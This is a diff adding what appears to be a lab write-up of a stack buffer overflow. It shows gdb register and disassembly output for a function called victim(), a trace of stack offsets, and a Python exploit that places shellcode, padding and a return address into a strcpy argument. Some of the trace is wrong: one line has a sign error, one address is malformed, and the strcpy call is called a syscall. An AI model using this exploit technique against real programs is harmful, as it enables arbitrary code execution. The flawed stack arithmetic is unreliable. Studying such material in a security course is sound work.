@@ -1,0 +1,49 @@
+(gdb) info reg
+eax            0xbffff511  -1073744623
+ecx            0xbffff300  -1073745152
+edx            0xb   11
+ebx            0x0   0
+esp            0xbffeccec  0xbffeccec
+ebp            0xbffecd08  0xbffecd08
+esi            0x0   0
+edi            0x8049770   134518640
+eip            0x8048ee0   0x8048ee0 <victim>
+eflags         0x200286 [ PF SF IF ID ]
+cs             0x73  115
+ss             0x7b  123
+ds             0x7b  123
+es             0x7b  123
+fs             0x0   0
+gs             0x33  51
+
+Dump of assembler code for function victim:
+=> 0x08048ee0 <+0>:	push   %ebp
+   0x08048ee1 <+1>:	mov    %esp,%ebp
+   0x08048ee3 <+3>:	sub    $0x88,%esp
+   0x08048ee9 <+9>:	mov    0x8(%ebp),%eax
+   0x08048eec <+12>:	mov    %eax,0x4(%esp)
+   0x08048ef0 <+16>:	lea    -0x6c(%ebp),%eax
+   0x08048ef3 <+19>:	mov    %eax,(%esp)
+   0x08048ef6 <+22>:	call   0x8048200
+   0x08048efb <+27>:	leave  
+   0x08048efc <+28>:	ret    
+End of assembler dump.
+
+Initially, we have esp = 0xbffeccec, and ebp = 0xbffecd08
+Tracing through each step in the disassembled victim():
+esp = esp - 4 = 0xbffecce8
+[0xbffecce8] = 0xbffecd08
+ebp = esp = 0xbffecce8
+esp = esp - 0x88 = 0xbffecc60
+eax = [ebp + 0x8] = [0xbffecce8 - 0x8] = [0xbffeccf0]
+[esp+4] = eax -> [0xbffeccd64] = [0xbffeccf0]
+eax = [ebp - 0x6c] = [0xbffecce8 - 0x6c] = [0xbffecc7c]
+[esp] = eax -> [0xbffecc60] = [0xbffecc7c]
+syscall for strcpy.
+
+So we see that buffer[100] is stored at 0xbffecc7c, and the return address is stored at 0xbffeccec. 0xbffeccec -  0xbffecc7c= 0x70 = 112. The shell code has length 23. So if our argument starts with the shell code, followed by a padding of 112-23 = 89 characters, followed by the address of the shellcode (0xbffecc7c), we would be able to change the return address to run our shell code upon return.
+Hence, we can use:
+from shellcode import shellcode
+from struct import pack
+
+print shellcode + "0"*89 + pack("<I", 0xbffecc7c)
